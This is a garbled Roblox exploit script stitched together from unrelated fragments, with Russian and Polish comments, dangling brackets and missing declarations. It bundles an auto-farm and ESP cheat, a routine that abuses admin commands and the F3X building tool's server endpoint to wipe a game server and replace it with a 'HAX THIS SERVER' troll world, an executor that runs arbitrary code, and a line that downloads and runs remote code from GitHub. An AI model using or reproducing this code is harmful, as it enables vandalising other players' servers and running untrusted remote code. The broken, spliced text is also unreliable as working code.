-- Скрипт для Аста Корона FE (Fire Emblem)
-- Улучшенная версия с авто-фармом и управлением

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Настройки
local Settings = {
    AutoFarm = true,
    AutoSwing = true,
    SwingDelay = 0.5,
    TargetRadius = 30,
    ShowESP = true
}

-- Функция для поиска врагов
local function findTargets()
    local targets = {}
    for _, enemy in ipairs(workspace.Enemies:GetChildren()) do
        if enemy:FindFirstChild("Humanoid") and enemy.Humanoid.Health > 0 then
            local distance = (enemy.HumanoidRootPart.Position - rootPart.Position).Magnitude
            if distance <= Settings.TargetRadius then
                table.insert(targets, enemy)
            end
        end
    end
    return targets
end

-- Функция атаки
local function attack(target)
    if not target then return end
    
    local sword = character:FindFirstChild("Sword") or character:FindFirstChild("Katana")
    if sword and sword:FindFirstChild("Handle") then
        sword.Handle.CFrame = target.HumanoidRootPart.CFrame
        sword:Activate()
    end
end

-- Функция для ESP
local function createESP(enemy)
    if not Settings.ShowESP then return end
    
    local esp = Instance.new("BillboardGui")
    esp.Name = "ESP"
    esp.Size = UDim2.new(0, 200, 0, 50)
    esp.AlwaysOnTop = true
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.new(1, 0, 0)
    label.Text = enemy.Name
    label.Font = Enum.Font.GothamBold
    label.TextSize = 14
    label.Parent = esp
    
    esp.Parent = enemy.Character or enemy
end

-- Основной цикл
spawn(function()
    while true do
        if Settings.AutoFarm then
            local targets = findTargets()
            if #targets > 0 then
                local nearest = targets[1]
                local minDist = math.huge
                
                for _, target in ipairs(targets) do
                    local dist = (target.HumanoidRootPart.Position - rootPart.Position).Magnitude
                    if dist < minDist then
                        minDist = dist
                        nearest = target
                    end
                end
                
                if nearest then
                    attack(nearest)
                end
            end
        end
        
        wait(Settings.SwingDelay)
    end
end)

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0, 10, 0, 10)

title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0.8, 0, 0, 30)
toggleButton.Position = UDim2.new(0.1, 0, 0.35, 0)
toggleButton.BackgroundColor3 = Color3.new(0, 1, 0)

    toggleButton.Text = Settings.AutoFarm and "Авто-фарм: ВКЛ" or "Авто-фарм: ВЫКЛ"
    toggleButton.BackgroundColor3 = Settings.AutoFarm and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)
end)

end

	if not char or not char:FindFirstChild("HumanoidRootPart") then return end

			hrp.CFrame = targetHrp.CFrame

local function getNearestPlayer()
	local closestPlayer = nil
	local shortestDistance = math.huge

	local localChar = LocalPlayer.Character
	if not localChar or not localChar:FindFirstChild("HumanoidRootPart") then return nil end

	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
			if checkTeamFilter and p.Team == LocalPlayer.Team then
				continue

			local dist = (p.Character.HumanoidRootPart.Position - localChar.HumanoidRootPart.Position).Magnitude
			if dist < shortestDistance then
				shortestDistance = dist
				closestPlayer = p
			end
		end
	end
	return closestPlayer
end

local function b64decode(s)
	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	s = s:gsub('[^' .. b .. '=]', '')
	return (s:gsub('.', function(x)
		if x == '=' then return '' end
		local r, f = '', (b:find(x) - 1)
		for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c = 0
		for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2^(8-i) or 0) end

	end))

local function buildRealm(opts)
	-- opts: { SpawnDecal, RulesDecal, BadDecal, SkyTexture, MusicID, TitleName }
	local remote = getSilentRemote()
	if remote then
		pcall(function() remote:InvokeServer(";btools me") end)
		task.wait(0.4)
		pcall(function() remote:InvokeServer(";punish all") end)
		task.wait(0.1)
	end

	local f3x = getF3XFromPlayer()
	if not f3x then
		warn("[Realm] you dont have f3x skid")
		return
	end
	local serverendpoint = f3x.SyncAPI.ServerEndpoint

	-- Удаляем всё
	deleteAllParts(serverendpoint)
	task.wait(0.3)

	if remote then
		pcall(function() remote:InvokeServer(";fogcolor black ;time") end)
	end

	-- Хелперы F3X
	local function resize(part, size, cf)
		pcall(function()
			serverendpoint:InvokeServer("SyncResize", {{Part = part, CFrame = cf, Size = size}})
		end)
	end
	local function syncmaterial(part, mate)
		pcall(function()
			serverendpoint:InvokeServer("SyncMaterial", {{Part = part, Material = mate}})
		end)
	end
	local function transparency(part, trans)
		pcall(function()
			serverendpoint:InvokeServer("SyncMaterial", {{Part = part, Transparency = trans}})
		end)
	end
	local function color(part, c)
		pcall(function()
			serverendpoint:InvokeServer("SyncColor", {{Part = part, Color = c, UnionColoring = false}})
		end)
	end
	local function syncmeshid(part, id)
		pcall(function()
			serverendpoint:InvokeServer("SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. id}})
		end)
	end
	local function makemesh(part)
		pcall(function()
			serverendpoint:InvokeServer("CreateMeshes", {{Part = part}})
		end)
	end
	local function syncmeshsize(part, vec)
		pcall(function()
			serverendpoint:InvokeServer("SyncMesh", {{Part = part, Scale = vec}})
		end)
	end
	local function syncmeshtexture(part, id)
		pcall(function()
			serverendpoint:InvokeServer("SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. id}})
		end)
	end
	local function name(part, s)
		pcall(function()
			serverendpoint:InvokeServer("SetName", {part}, s)
		end)
	end
	local function lock(part, b)
		pcall(function()
			serverendpoint:InvokeServer("SetLocked", {part}, b)
		end)
	end
	local function setcollision(part, b)
		pcall(function()
			serverendpoint:InvokeServer("SyncCollision", {{Part = part, CanCollide = b}})
		end)
	end
	local function createdecal(part, side)
		pcall(function()
			serverendpoint:InvokeServer("CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}})
		end)
	end
	local function setdecal(part, asset, side)
		pcall(function()
			serverendpoint:InvokeServer("SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}})
		end)
	end

	-- Базовое основание
	local function makerealmbase()
		local position = CFrame.new(0, 5, 0)
		local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
		resize(base, Vector3.new(512, 16, 512), position)
		syncmaterial(base, Enum.Material.Concrete)
		color(base, Color3.new(0.513725, 0.513725, 0.513725))
		name(base, "loltroll")
		lock(base, true)

		local spawnpos = CFrame.new(34.5, 8.1, -26)
		local spawna = serverendpoint:InvokeServer("CreatePart", "Spawn", spawnpos, workspace)
		resize(spawna, Vector3.new(20, 10, 20), spawnpos)
		name(spawna, "SpawnLocation")
		lock(spawna, true)
		createdecal(spawna, Enum.NormalId.Top)
		setdecal(spawna, opts.SpawnDecal, Enum.NormalId.Top)
		transparency(spawna, 1)

		local pos1 = CFrame.new(74.143, 24, -25.232)
		local rules = serverendpoint:InvokeServer("CreatePart", "Normal", pos1, workspace)
		transparency(rules, 0)
		setcollision(rules, false)
		createdecal(rules, Enum.NormalId.Left)
		setdecal(rules, opts.RulesDecal, Enum.NormalId.Left)
		color(rules, Color3.new(1, 1, 1))
		resize(rules, Vector3.new(4, 23, 37), pos1)

		local pos2 = CFrame.new(1.143, 24, -25.232)
		local bad = serverendpoint:InvokeServer("CreatePart", "Normal", pos2, workspace)
		transparency(bad, 1)
		setcollision(bad, false)
		createdecal(bad, Enum.NormalId.Right)
		setdecal(bad, opts.BadDecal, Enum.NormalId.Right)
		resize(bad, Vector3.new(4, 23, 37), pos2)
	end

	-- Скайбокс
	local function sky()
		local position = CFrame.new(0, 5, 0)
		local skyPart = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
		makemesh(skyPart)
		syncmeshid(skyPart, "139706960202832")
		syncmeshtexture(skyPart, opts.SkyTexture)
		syncmeshsize(skyPart, Vector3.new(20000, 20000, 20000))
		lock(skyPart, true)
		name(skyPart, "Sky")
		setcollision(skyPart, false)
	end

	sky()
	makerealmbase()

	if remote then
		pcall(function() remote:InvokeServer(";res all") end)
		task.wait(0.3)
		pcall(function() remote:InvokeServer(";r6 all") end)
		pcall(function() remote:InvokeServer(";time 14") end)
		task.wait(0.7)
		pcall(function()
			remote:InvokeServer(";music " .. opts.MusicID .. " ;volume inf ; ;char all " .. opts.TitleName .. " " .. opts.TitleName .. " HAX THIS SERVER L0LZ")
		end)
	end

	container.Name = "Grid_" .. title

	container.Position = UDim2.new(0, PAD, 0, yPos + HEADER_H + 2)

		yPos = yPos,
	}

	return section
end

local function addGridButton(section, text, callback)
	local idx = #section.buttons
	local col = idx % COLS
	local row = math.floor(idx / COLS)

	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(0, BTN_W, 0, BTN_H)
	btn.Position = UDim2.new(0, col * (BTN_W + BTN_GAP_X), 0, row * (BTN_H + BTN_GAP_Y))
	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	btn.BackgroundTransparency = 0.35
	btn.BorderSizePixel = 0
	btn.Font = Enum.Font.SourceSansBold
	btn.Text = text
	btn.TextColor3 = PURPLE
	btn.TextSize = 12
	btn.ZIndex = 4
	btn.TextWrapped = true
	btn.Parent = section.container
	addStroke(btn, 1.2)
	if callback then btn.MouseButton1Click:Connect(callback) end

	table.insert(section.buttons, btn)
	table.insert(allButtons, btn)

	local totalRows = math.ceil(#section.buttons / COLS)
	section.container.Size = UDim2.new(1, -PAD*2, 0, totalRows * (BTN_H + BTN_GAP_Y) - BTN_GAP_Y)

	return btn
end

local function finalizeLayout()
	local y = PAD + 30
	for _, sec in ipairs(sections) do
		sec.header.Position = UDim2.new(0, PAD, 0, y)
		sec.container.Position = UDim2.new(0, PAD, 0, y + HEADER_H + 2)
		y = y + HEADER_H + 2 + sec.container.Size.Y.Offset + SECTION_GAP
	end
	local totalH = y - SECTION_GAP + PAD
	MainFrame.Size = UDim2.new(0, GUI_WIDTH, 0, totalH)
	return totalH
end

local function getNextTabNumber()
	local used = {}
	for _, t in ipairs(tabs) do used[t.number] = true end
	for i = 1, MAX_TABS do
		if not used[i] then return i end
	end
	return nil
end

local function updateLineNumbers(textBox)
	local lines = 1
	for _ in textBox.Text:gmatch("\n") do lines = lines + 1 end

	LineNumbers.Text = str

		t.label.TextColor3 = Color3.fromRGB(180, 180, 180)

	tab.label.TextColor3 = Color3.fromRGB(230, 230, 230)
	currentTab = tab

local function closeTab(tab)
	if #tabs <= 1 then return end
	local idx
	for i, t in ipairs(tabs) do if t == tab then idx = i break end end
	if not idx then return end
	tab.frame:Destroy()
	tab.textBox:Destroy()
	table.remove(tabs, idx)
	if currentTab == tab then switchToTab(tabs[math.min(idx, #tabs)]) end
end

	local num = getNextTabNumber()

	closeBtn.Size = UDim2.new(0, 12, 1, 0)
	closeBtn.Font = Enum.Font.SourceSans
	closeBtn.Text = "x"
	closeBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	closeBtn.TextSize = 11
	closeBtn.MouseButton1Click:Connect(function() closeTab(tab) end)

	local textBox = Instance.new("TextBox")
	textBox.Parent = EditorContainer
	textBox.BackgroundTransparency = 1
	textBox.Position = UDim2.new(0, 30, 0, 5)
	textBox.Size = UDim2.new(1, -35, 1, -10)
	textBox.ClearTextOnFocus = false
	textBox.Font = Enum.Font.Code
	textBox.MultiLine = true
	textBox.Text = ""
	textBox.TextColor3 = PINK
	textBox.TextSize = 14
	textBox.TextXAlignment = Enum.TextXAlignment.Left
	textBox.TextYAlignment = Enum.TextYAlignment.Top
	textBox.Visible = false
	tab.textBox = textBox

	textBox:GetPropertyChangedSignal("Text"):Connect(function()
		if currentTab == tab then updateLineNumbers(textBox) end
	end)

	label.MouseButton1Click:Connect(function() switchToTab(tab) end)
	table.insert(tabs, tab)
	switchToTab(tab)
	return tab
end

local function runCode(code)
	if not code or code == "" or code:match("^%s*$") then return end
	local chunk, err = loadstring(code)
	if chunk then
		local ok, msg = pcall(chunk)
		if not ok then warn("Błąd wykonania: " .. tostring(msg)) end
	else
		warn("Błąd składni: " .. tostring(err))
	end
end

-- ========== OUTPUT ==========
local function addLog(text, color)
	local label = Instance.new("TextLabel")
	label.Parent = OutputContainer
	label.Size = UDim2.new(1, -4, 0, 16)
	label.BackgroundTransparency = 1
	label.Text = text
	label.Font = Enum.Font.Code
	label.TextSize = 13
	label.TextColor3 = color or Color3.fromRGB(200, 200, 200)
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.TextWrapped = true
	label.AutomaticSize = Enum.AutomaticSize.Y
	task.defer(function()
		OutputContainer.CanvasSize = UDim2.new(0, 0, 0, OutputLayout.AbsoluteContentSize.Y + 8)
		OutputContainer.CanvasPosition = Vector2.new(0, OutputContainer.CanvasSize.Y.Offset)
	end)
end

LogService.MessageOut:Connect(function(message, messageType)
	local color = Color3.fromRGB(200, 200, 200)
	if messageType == Enum.MessageType.MessageWarning then color = Color3.fromRGB(255, 200, 50)
	elseif messageType == Enum.MessageType.MessageError then color = Color3.fromRGB(255, 80, 80)
	elseif messageType == Enum.MessageType.MessageInfo then color = Color3.fromRGB(100, 180, 255) end
	addLog(message, color)
end)

addLog("-- Output --", PINK)
addLog("Waiting for console logs...", Color3.fromRGB(120, 120, 120))

OutputTab.MouseButton1Click:Connect(showOutputView)
ExecutorTab.MouseButton1Click:Connect(showExecutorView)
AddTabBtn.MouseButton1Click:Connect(createTab)

ExecuteBtn.MouseButton1Click:Connect(function()
	if showingOutput or not currentTab then return end
	runCode(currentTab.textBox.Text)
end)

ClearBtn.MouseButton1Click:Connect(function()
	if showingOutput then
		for _, c in ipairs(OutputContainer:GetChildren()) do
			if c:IsA("TextLabel") then c:Destroy() end
		end
		addLog("-- Output cleared --", Color3.fromRGB(120, 120, 120))
	elseif currentTab then
		currentTab.textBox.Text = ""
	end
end)

-- Script Hub

	local ok, err = pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))()
	end)
	if not ok then
		warn("[Script Hub]: " .. tostring(err))
	else
		print("[Script Hub]: Loaded")
	end
end)

SettingsBtn.MouseButton1Click:Connect(function()
	SettingsCard.Visible = not SettingsCard.Visible
end)

SettingsClose.MouseButton1Click:Connect(function()
	SettingsCard.Visible = false
end)

AutoToggle.MouseButton1Click:Connect(function()
	autoExecute = not autoExecute
	if autoExecute then
		AutoToggle.BackgroundColor3 = Color3.fromRGB(40, 180, 60)
		print("[Settings]: Auto Execute ON")
		if currentTab and not showingOutput then
			runCode(currentTab.textBox.Text)
		end
	else
		AutoToggle.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
		print("[Settings]: Auto Execute OFF")
	end
end)

	ScreenGui:Destroy()
end)

	MainFrame.Visible = not MainFrame.Visible
end)
